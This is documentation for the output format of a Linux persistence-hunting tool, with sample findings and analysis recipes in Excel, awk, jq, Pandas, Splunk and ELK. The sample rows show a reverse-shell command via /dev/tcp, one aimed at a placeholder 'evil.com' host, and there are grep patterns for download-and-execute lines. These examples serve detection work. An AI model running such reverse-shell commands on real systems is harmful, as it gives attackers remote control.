# Persistnux CSV/JSONL Output Format v1.4.0

## Overview

Starting with v1.4.0, Persistnux uses a **clean, structured CSV format** designed for easy analysis in Excel, LibreOffice Calc, or data analysis tools like Pandas, Splunk, and ELK.

## CSV Structure

### Column Layout

| Column | Name | Type | Description |
|--------|------|------|-------------|
| 1 | `timestamp` | ISO 8601 | When the finding was detected (UTC) |
| 2 | `hostname` | String | System hostname where scan was run |
| 3 | `category` | String | Type of persistence (Systemd Service, Cron System, Shell Profile, etc.) |
| 4 | `confidence` | Enum | LOW, MEDIUM, HIGH, or CRITICAL |
| 5 | `file_path` | String | Full path to the file |
| 6 | `file_hash` | SHA256 | SHA256 hash of the file (or "N/A") |
| 7 | `file_owner` | String | Owner:Group (e.g., "root:root") |
| 8 | `file_permissions` | Octal | File permissions (e.g., "644", "755") |
| 9 | `file_age_days` | Integer | Days since last modification |
| 10 | `package_status` | String | Package manager status (e.g., "dpkg:openssh-server", "unmanaged") |
| 11 | `command` | String | The actual command being executed (ExecStart, cron command, etc.) |
| 12 | `enabled_status` | String | enabled/disabled (for services), or empty |
| 13 | `description` | String | Human-readable description |

---

## Example CSV Row

### Malicious Systemd Service

```csv
2026-01-23T10:30:05Z,ubuntu-server,Systemd Service,HIGH,/etc/systemd/system/backdoor.service,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855,root:root,644,2,unmanaged,/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444',enabled,backdoor.service
```

**Breakdown**:
- **timestamp**: 2026-01-23T10:30:05Z
- **hostname**: ubuntu-server
- **category**: Systemd Service
- **confidence**: HIGH
- **file_path**: /etc/systemd/system/backdoor.service
- **file_hash**: e3b0c44... (SHA256)
- **file_owner**: root:root
- **file_permissions**: 644
- **file_age_days**: 2 (created 2 days ago)
- **package_status**: unmanaged (NOT from package manager)
- **command**: /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444' (reverse shell!)
- **enabled_status**: enabled (runs on boot)
- **description**: backdoor.service

---

### Legitimate Package-Managed Service

```csv
2026-01-23T10:30:10Z,ubuntu-server,Systemd Service,LOW,/lib/systemd/system/ssh.service,a1b2c3d4e5f6...,root:root,644,180,dpkg:openssh-server,/usr/sbin/sshd -D $SSHD_OPTS,enabled,ssh.service
```

**Breakdown**:
- **confidence**: LOW (package-managed + safe command)
- **package_status**: dpkg:openssh-server (managed by openssh-server package)
- **command**: /usr/sbin/sshd -D $SSHD_OPTS (safe system binary)
- **file_age_days**: 180 (6 months old)

---

## JSONL Structure

Each line is a complete JSON object:

```json
{
  "timestamp": "2026-01-23T10:30:05Z",
  "hostname": "ubuntu-server",
  "category": "Systemd Service",
  "confidence": "HIGH",
  "file_path": "/etc/systemd/system/backdoor.service",
  "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  "file_owner": "root:root",
  "file_permissions": "644",
  "file_age_days": "2",
  "package_status": "unmanaged",
  "command": "/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444'",
  "enabled_status": "enabled",
  "description": "backdoor.service"
}
```

---

## Field Details

### timestamp
- Format: ISO 8601 UTC
- Example: `2026-01-23T10:30:05Z`
- Use: Sort chronologically, correlate with other logs

### hostname
- System hostname
- Example: `ubuntu-server`, `web01.company.com`
- Use: Identify which system the finding is from (useful when aggregating multiple scans)

### category
- Type of persistence mechanism
- Values:
  - `Systemd Service`
  - `Cron System`
  - `Cron User`
  - `ShellProfile System`
  - `ShellProfile User`
  - `SSH AuthorizedKeys`
  - `SSH Config`
  - `Init Script`
  - `Preload LDPreload`
  - `XDG Autostart`
  - `PAM Config`
  - etc.
- Use: Filter by persistence type, group similar findings

### confidence
- Assessment of how suspicious the finding is
- Values: `LOW`, `MEDIUM`, `HIGH`, `CRITICAL`
- Logic:
  - **LOW**: Package-managed, safe commands, standard configs
  - **MEDIUM**: Unknown/custom commands, not obviously malicious
  - **HIGH**: Suspicious patterns (reverse shells, download-execute, etc.)
  - **CRITICAL**: Multiple HIGH indicators (reserved for future use)
- Use: **Triage priority** - review HIGH first, MEDIUM next, skip LOW on clean systems

### file_path
- Full absolute path to the file
- Example: `/etc/systemd/system/malware.service`
- Use: Locate the file for investigation, extract for analysis

### file_hash
- SHA256 hash of the file
- Example: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`
- Value: `N/A` if file couldn't be hashed (permissions, doesn't exist, etc.)
- Use: IOC matching, VirusTotal lookup, deduplication across systems

### file_owner
- File owner and group
- Format: `owner:group`
- Example: `root:root`, `www-data:www-data`, `user:user`
- Use: Identify unusual ownership (e.g., user-owned service in /etc/systemd/system)

### file_permissions
- Octal file permissions
- Example: `644`, `755`, `600`
- Use: Identify overly permissive files (777, 666), world-writable persistence

### file_age_days
- Days since last modification
- Example: `2`, `180`, `N/A`
- Logic: `(current_time - file_mtime) / 86400`
- Use: Identify recently created/modified files, correlate with incident timeline

### package_status
- Package manager ownership
- Values:
  - `dpkg:package-name` (Debian/Ubuntu)
  - `rpm:package-name` (RedHat/CentOS/Fedora)
  - `unmanaged` (not from package manager)
  - `N/A` (couldn't determine)
- Example: `dpkg:openssh-server`, `unmanaged`
- Use: **Critical for false positive reduction** - unmanaged files are more suspicious

### command
- The actual command being executed
- For Systemd: ExecStart value
- For Cron: Cron command
- For Shell Profiles: Suspicious line content
- Example: `/usr/sbin/sshd -D`, `bash -i >& /dev/tcp/evil.com/4444`
- Use: **Primary indicator** - analyze for malicious patterns, reverse shells, download-execute

### enabled_status
- For services: `enabled` or `disabled`
- For non-services: empty string
- Use: Enabled services run on boot (higher priority for investigation)

### description
- Human-readable description
- Usually: service name, script name, config type
- Example: `sshd.service`, `malware.service`, `user profile for john`
- Use: Quick identification, reporting

---

## Analysis Examples

### Excel/LibreOffice Analysis

```excel
# Filter HIGH confidence findings
Filter: Column D (confidence) = "HIGH"

# Filter unmanaged files
Filter: Column J (package_status) = "unmanaged"

# Filter recent files (<7 days)
Filter: Column I (file_age_days) < 7

# Find reverse shells
Filter: Column K (command) contains "/dev/tcp/"
```

### Command-Line Analysis

```bash
# Show only HIGH confidence
awk -F',' '$4 == "HIGH"' persistnux_*.csv

# Show unmanaged files
awk -F',' '$10 == "unmanaged"' persistnux_*.csv

# Show files modified in last 7 days
awk -F',' '$9 != "N/A" && $9 < 7' persistnux_*.csv

# Extract unique commands
cut -d',' -f11 persistnux_*.csv | sort -u

# Count by confidence level
cut -d',' -f4 persistnux_*.csv | tail -n +2 | sort | uniq -c
```

### jq Analysis (JSONL)

```bash
# HIGH confidence findings
jq 'select(.confidence == "HIGH")' persistnux_*.jsonl

# Unmanaged files only
jq 'select(.package_status == "unmanaged")' persistnux_*.jsonl

# Recent files (<7 days)
jq 'select(.file_age_days != "N/A" and (.file_age_days | tonumber) < 7)' persistnux_*.jsonl

# Find reverse shells
jq 'select(.command | contains("/dev/tcp/"))' persistnux_*.jsonl

# Group by category and count
jq -r '.category' persistnux_*.jsonl | sort | uniq -c

# Export specific fields for IOC list
jq -r '[.file_path, .file_hash, .command] | @csv' persistnux_*.jsonl
```

### Python/Pandas Analysis

```python
import pandas as pd

# Load CSV
df = pd.read_csv('persistnux_ubuntu-server_20260123_103000.csv')

# Filter HIGH confidence
high_conf = df[df['confidence'] == 'HIGH']

# Filter unmanaged files
unmanaged = df[df['package_status'] == 'unmanaged']

# Filter recent files
recent = df[df['file_age_days'] < 7]

# Find reverse shells
reverse_shells = df[df['command'].str.contains('/dev/tcp/', na=False)]

# Summary by category
df.groupby('category')['confidence'].value_counts()

# Timeline analysis
df['timestamp'] = pd.to_datetime(df['timestamp'])
df.sort_values('timestamp').plot(x='timestamp', y='confidence', kind='scatter')
```

### Splunk Query

```spl
index=dfir sourcetype=persistnux:csv
| search confidence=HIGH
| stats count by category, package_status
| sort -count
```

### ELK Query

```json
{
  "query": {
    "bool": {
      "must": [
        { "match": { "confidence": "HIGH" }},
        { "match": { "package_status": "unmanaged" }}
      ]
    }
  }
}
```

---

## Comparison: v1.3 vs v1.4

### v1.3 (Old Format)

```csv
timestamp,category,subcategory,persistence_type,location,description,confidence,sha256,metadata,additional_info
2026-01-23T10:30:05Z,Systemd,Service,systemd_service,/etc/systemd/system/backdoor.service,"Service: backdoor.service | Status: enabled | ExecStart: /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444'",HIGH,e3b0c44...,mode:644|owner:root:root|size:256|modified:1706014800,enabled=enabled|days_old=2|package=unmanaged
```

**Problems**:
- Description field cramming multiple values
- metadata and additional_info are pipe-delimited strings (hard to parse)
- Need regex/parsing to extract ExecStart, owner, permissions
- Not Excel-friendly

### v1.4 (New Format)

```csv
timestamp,hostname,category,confidence,file_path,file_hash,file_owner,file_permissions,file_age_days,package_status,command,enabled_status,description
2026-01-23T10:30:05Z,ubuntu-server,Systemd Service,HIGH,/etc/systemd/system/backdoor.service,e3b0c44...,root:root,644,2,unmanaged,/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444',enabled,backdoor.service
```

**Benefits**:
- ✅ Each field is a separate column
- ✅ Easy to filter, sort, pivot in Excel
- ✅ Command is directly visible
- ✅ No parsing needed
- ✅ Analyst-friendly

---

## Recommended Workflow

### 1. Quick Triage

```bash
# Run scan
sudo ./persistnux.sh

# Check HIGH confidence findings
grep ",HIGH," persistnux_output/*.csv
```

### 2. Detailed Analysis in Excel

1. Open CSV in Excel/LibreOffice
2. Enable AutoFilter (Data → Filter)
3. Filter by:
   - Confidence = HIGH
   - Package Status = unmanaged
   - File Age Days < 7
4. Review `command` column for suspicious patterns
5. Investigate matching files

### 3. IOC Extraction

```bash
# Extract file hashes for IOC sharing
awk -F',' '$4 == "HIGH" {print $6}' persistnux_*.csv > ioc_hashes.txt

# Extract file paths for remediation
awk -F',' '$4 == "HIGH" {print $5}' persistnux_*.csv > files_to_investigate.txt

# Extract commands for pattern analysis
awk -F',' '$4 == "HIGH" {print $11}' persistnux_*.csv > malicious_commands.txt
```

### 4. Cross-System Correlation

```bash
# Combine multiple scans
cat scan1/*.csv scan2/*.csv scan3/*.csv > combined.csv

# Find common hashes
cut -d',' -f6 combined.csv | sort | uniq -c | sort -rn

# Find common commands
cut -d',' -f11 combined.csv | sort | uniq -c | sort -rn
```

---

## Tips for Large Datasets

### Filtering Strategies

**For clean systems** (baseline):
```bash
# Show only unmanaged files
awk -F',' '$10 == "unmanaged"' persistnux_*.csv
```

**For compromised systems**:
```bash
# HIGH confidence only
awk -F',' '$4 == "HIGH"' persistnux_*.csv

# Recent + unmanaged
awk -F',' '$9 < 7 && $10 == "unmanaged"' persistnux_*.csv
```

**For threat hunting**:
```bash
# Look for specific patterns
grep -i "wget.*bash\|curl.*bash\|/dev/tcp/" persistnux_*.csv
```

---

## Summary

**v1.4.0 CSV Format** provides:

✅ **Clean structure**: Each important field in its own column
✅ **Analyst-friendly**: Easy to filter, sort, analyze in Excel
✅ **Command visibility**: Actual executed command directly visible
✅ **No parsing needed**: No more extracting values from pipe-delimited strings
✅ **Tool-ready**: Works seamlessly with Pandas, Splunk, ELK, jq

**Result**: Faster analysis, clearer findings, better DFIR efficiency!
